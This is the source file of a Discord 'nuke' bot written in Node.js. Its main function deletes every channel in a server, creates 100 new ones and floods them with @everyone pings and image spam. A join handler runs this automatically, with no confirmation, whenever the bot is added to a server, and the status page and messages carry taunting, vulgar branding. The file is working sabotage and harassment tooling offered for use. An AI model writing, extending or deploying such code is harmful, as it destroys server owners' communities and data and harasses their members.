// index.js - ULTRA FAST DISCORD NUKE BOT WITH IMAGE SPAM
require('dotenv').config();
const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js');
const express = require('express');
const chalk = require('chalk');
const config = require('./config.js');

// Express server for Render
const app = express();
const PORT = process.env.PORT || config.port;

app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>ULTRA NUKE BOT</title>
                <style>
                    body { 
                        background: linear-gradient(45deg, #000000, #ff0000);
                        color: white;
                        font-family: Arial;
                        text-align: center;
                        padding: 50px;
                    }
                    h1 { font-size: 50px; text-shadow: 0 0 10px red; }
                    .stats { 
                        background: rgba(0,0,0,0.7);
                        padding: 20px;
                        border-radius: 10px;
                        border: 2px solid red;
                        font-size: 20px;
                    }
                    .blink { animation: blink 1s infinite; }
                    @keyframes blink { 50% { opacity: 0; } }
                    .counter { color: #ff0000; font-size: 30px; }
                </style>
            </head>
            <body>
                <h1>💀 ULTRA FAST NUKE BOT 💀</h1>
                <div class="stats">
                    <h2 class="blink">✅ BOT OPERATIONAL</h2>
                    <p>🔥 <span class="counter">100 CHANNELS</span> 🔥</p>
                    <p>⚡ <span class="counter">1000 MESSAGES INCOMING</span> ⚡</p>
                    <p>🖼️ <span class="counter">SINGLE CHANNEL MASSACRE</span> 🖼️</p>
                    <p>💀 ANDI NEWTONTE AMMEDA VAYIL</p>
                    <p>⚡ By: DICK BY IMPOSTER NETWORK</p>
                    <p>📊 Command: <span style="color: #ff0000">!nuke</span></p>
                </div>
            </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(chalk.green(`[SERVER] Health check running on port ${PORT}`));
});

// Initialize Discord Client
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// Console Colors
const colors = {
    red: chalk.red.bold,
    green: chalk.green.bold,
    yellow: chalk.yellow.bold,
    blue: chalk.blue.bold,
    magenta: chalk.magenta.bold,
    cyan: chalk.cyan.bold,
    rainbow: (text) => {
        const colors = [chalk.red, chalk.yellow, chalk.green, chalk.blue, chalk.magenta, chalk.cyan];
        return text.split('').map((char, i) => colors[i % colors.length](char)).join('');
    }
};

// Bot Ready
client.once('ready', () => {
    console.clear();
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
    console.log(colors.red('██╗   ██╗██╗  ████████╗██████╗  █████╗     ███████╗ █████╗ ███████╗████████╗'));
    console.log(colors.red('██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔════╝╚══██╔══╝'));
    console.log(colors.red('██║   ██║██║     ██║   ██████╔╝███████║    █████╗  ██║  ██║███████╗   ██║   '));
    console.log(colors.red('██║   ██║██║     ██║   ██╔══██╗██╔══██║    ██╔══╝  ██║  ██║╚════██║   ██║   '));
    console.log(colors.red('╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ██║     ╚█████╔╝███████╗   ██║   '));
    console.log(colors.red(' ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝      ╚════╝ ╚══════╝   ╚═╝   '));
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
    console.log(colors.green(`✅ BOT: ${client.user.tag}`));
    console.log(colors.yellow(`📊 SERVERS: ${client.guilds.cache.size}`));
    console.log(colors.red(`💀 NUKE MODE: INSTANT - NO CONFIRMATION`));
    console.log(colors.cyan(`⚡ CHANNELS TO CREATE: ${config.channelsToCreate}`));
    console.log(colors.magenta(`🔥 MESSAGES PER CHANNEL: ${config.messagesPerChannel}`));
    console.log(colors.blue(`💬 TOTAL @everyone SPAM: ${config.channelsToCreate * config.messagesPerChannel}`));
    console.log(colors.yellow(`🖼️ IMAGE SPAM: ACTIVE`));
    console.log(colors.red(`🔥 1000 MESSAGES INCOMING`));
    console.log(colors.red(`⚡ SINGLE CHANNEL MASSACRE`));
    console.log(colors.red(`💀 ANDI NEWTONTE AMMEDA VAYIL`));
    console.log(colors.red(`💀 BY: DICK BY IMPOSTER NETWORK`));
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));

    // Rotating Status
    let statusIndex = 0;
    setInterval(() => {
        const status = config.statusMessages[statusIndex % config.statusMessages.length];
        client.user.setPresence({
            activities: [{ name: status, type: ActivityType.Playing }],
            status: 'dnd'
        });
        statusIndex++;
    }, 5000);
});

// AUTO-NUKE ON JOIN
client.on('guildCreate', async (guild) => {
    if (!config.autoNukeOnJoin) return;
    
    console.log(colors.red(`[!] AUTO-NUKE: Joined ${guild.name}`));
    await delay(1000);
    await executeNuke(guild);
});

// MESSAGE COMMAND HANDLER
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(config.prefix)) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'nuke') {
        console.log(colors.red(`[NUKE] Triggered by ${message.author.tag} in ${message.guild.name}`));
        
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ Admin only!');
        }
        
        await message.reply('💀 **INSTANT NUKE ACTIVATED** 💀\n🔥 1000 MESSAGES INCOMING...');
        await executeNuke(message.guild);
        return;
    }

    if (command === 'help') {
        const helpEmbed = {
            color: 0xff0000,
            title: '💀 ULTRA FAST NUKE BOT 💀',
            description: '**100 CHANNELS | 1000 MESSAGES INCOMING | SINGLE CHANNEL MASSACRE**',
            fields: [
                {
                    name: '!nuke',
                    value: '💥 INSTANT - Deletes ALL channels, creates 100 channels, spams 1000 messages + IMAGES',
                    inline: false
                },
                {
                    name: '!help',
                    value: '📚 Shows this message',
                    inline: false
                }
            ],
            footer: { text: 'ANDI NEWTONTE AMMEDA VAYIL | DICK BY IMPOSTER NETWORK | x9' }
        };
        await message.channel.send({ embeds: [helpEmbed] });
        return;
    }
});

// Function to send spam messages with images and x9 - UPDATED
async function sendSpamWithImage(channel, messageCount) {
    const promises = [];
    
    for (let m = 0; m < messageCount; m++) {
        const randomMsg = config.spamMessages[m % config.spamMessages.length];
        
        if (m % 2 === 0) {
            // Send text with @everyone and x9
            promises.push(
                channel.send(randomMsg).catch(e => null)
            );
        } else {
            // Send image with @everyone and x9 - UPDATED
            promises.push(
                channel.send({
                    content: `@everyone 💀 **XPORDINTE ANDI NEWTONTE AMMEDE VAYIL** 💀 @everyone\n**x9**`,
                    files: [config.imageUrl]
                }).catch(e => null)
            );
        }
    }
    
    await Promise.all(promises);
    return messageCount;
}

// MAIN NUKE FUNCTION
async function executeNuke(guild) {
    console.log(colors.red(`[NUKE] STARTING ULTRA FAST OPERATION in ${guild.name}`));
    console.log(colors.red(`🔥 1000 MESSAGES INCOMING...`));
    console.log(colors.red(`⚡ SINGLE CHANNEL MASSACRE...`));
    const startTime = Date.now();
    
    try {
        // PHASE 1: DELETE ALL CHANNELS
        console.log(colors.yellow(`[PHASE 1] Deleting all channels...`));
        const channels = await guild.channels.fetch();
        const channelList = Array.from(channels.values());
        
        let deleted = 0;
        const deletePromises = channelList.map(async (channel) => {
            try {
                await channel.delete();
                deleted++;
                console.log(colors.red(`[DELETE] ${channel.name}`));
            } catch (e) {}
        });
        
        await Promise.all(deletePromises);
        console.log(colors.green(`[PHASE 1] Deleted ${deleted} channels`));
        
        // PHASE 2: CREATE 100 CHANNELS
        console.log(colors.yellow(`[PHASE 2] Creating ${config.channelsToCreate} channels...`));
        
        const createdChannels = [];
        for (let i = 0; i < config.channelsToCreate; i += 5) {
            const batchPromises = [];
            for (let j = 0; j < 5 && (i + j) < config.channelsToCreate; j++) {
                const channelNum = i + j + 1;
                const channelName = channelNum === 1 ? config.channelName : `${config.channelName}-${channelNum}`;
                
                batchPromises.push(
                    guild.channels.create({
                        name: channelName,
                        type: 0,
                        reason: 'ANDI NEWTONTE AMMEDA VAYIL'
                    }).then(channel => {
                        createdChannels.push(channel);
                        console.log(colors.green(`[CREATE] ${channelName}`));
                        return channel;
                    }).catch(e => null)
                );
            }
            await Promise.all(batchPromises);
            await delay(200);
        }
        
        console.log(colors.green(`[PHASE 2] Created ${createdChannels.length} channels`));
        
        // PHASE 3: MASS SPAM WITH IMAGES AND x9
        console.log(colors.yellow(`[PHASE 3] Starting MASS SPAM - 1000 MESSAGES INCOMING...`));
        
        let totalMessages = 0;
        
        for (const channel of createdChannels) {
            try {
                await sendSpamWithImage(channel, config.messagesPerChannel);
                totalMessages += config.messagesPerChannel;
                
                if (totalMessages % 100 === 0) {
                    console.log(colors.cyan(`[SPAM] ${totalMessages}/1000 messages sent`));
                }
                
                await channel.send({
                    content: `@everyone **MASS NUKE COMPLETE** @everyone\n**x9**`,
                    embeds: [{
                        color: 0xff0000,
                        title: '💀 MASS NUKE COMPLETE 💀',
                        description: `**100 CHANNELS | 1000 MESSAGES INCOMING | SINGLE CHANNEL MASSACRE**\n\n**x9**`,
                        fields: [
                            { name: 'Channels Deleted', value: `${deleted}`, inline: true },
                            { name: 'Channels Created', value: `${createdChannels.length}`, inline: true },
                            { name: 'Messages Sent', value: `${totalMessages}`, inline: true },
                            { name: '@everyone Pings', value: `${totalMessages}`, inline: true },
                            { name: 'Images Sent', value: `${Math.floor(totalMessages / 2)}`, inline: true },
                            { name: 'Time Taken', value: `${((Date.now() - startTime)/1000).toFixed(1)}s`, inline: true },
                            { name: 'By', value: 'ANDI NEWTONTE AMMEDA VAYIL', inline: true }
                        ],
                        footer: { text: 'DICK BY IMPOSTER NETWORK | SINGLE CHANNEL MASSACRE | x9' },
                        image: { url: config.imageUrl }
                    }],
                    files: [config.imageUrl]
                }).catch(e => null);
                
            } catch (e) {}
        }
        
        const totalTime = ((Date.now() - startTime)/1000).toFixed(1);
        
        console.log(colors.rainbow('══════════════════════════════════════════════'));
        console.log(colors.red(`💀 ULTRA FAST NUKE COMPLETE!`));
        console.log(colors.yellow(`📊 FINAL STATISTICS:`));
        console.log(colors.green(`   ├─ Deleted: ${deleted} channels`));
        console.log(colors.green(`   ├─ Created: ${createdChannels.length} channels`));
        console.log(colors.green(`   ├─ @everyone Messages: ${totalMessages}/1000`));
        console.log(colors.green(`   ├─ Images Sent: ${Math.floor(totalMessages / 2)}`));
        console.log(colors.green(`   └─ Time: ${totalTime} seconds`));
        console.log(colors.red(`🔥 1000 MESSAGES INCOMING - COMPLETED`));
        console.log(colors.red(`⚡ SINGLE CHANNEL MASSACRE - COMPLETED`));
        console.log(colors.red(`💀 ANDI NEWTONTE AMMEDA VAYIL`));
        console.log(colors.rainbow('══════════════════════════════════════════════'));
        
        if (createdChannels.length > 0) {
            try {
                await createdChannels[0].send({
                    content: `@everyone **NUKE COMPLETE** @everyone\n**${totalMessages}/1000 messages sent + ${Math.floor(totalMessages / 2)} images in ${totalTime}s**\n\n**ANDI NEWTONTE AMMEDA VAYIL**\n**x9**`,
                    files: [config.imageUrl]
                });
            } catch (e) {}
        }
        
    } catch (error) {
        console.log(colors.red(`[FATAL] ${error.message}`));
    }
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

client.on('error', console.error);
process.on('unhandledRejection', console.error);

if (!config.token || config.token === 'YOUR_BOT_TOKEN_HERE') {
    console.log(colors.red('[ERROR] No token in config.js'));
    console.log(colors.yellow('Set DISCORD_TOKEN in .env file'));
    process.exit(1);
}

client.login(config.token).then(() => {
    console.log(colors.green('[LOGIN] Success!'));
}).catch(console.error);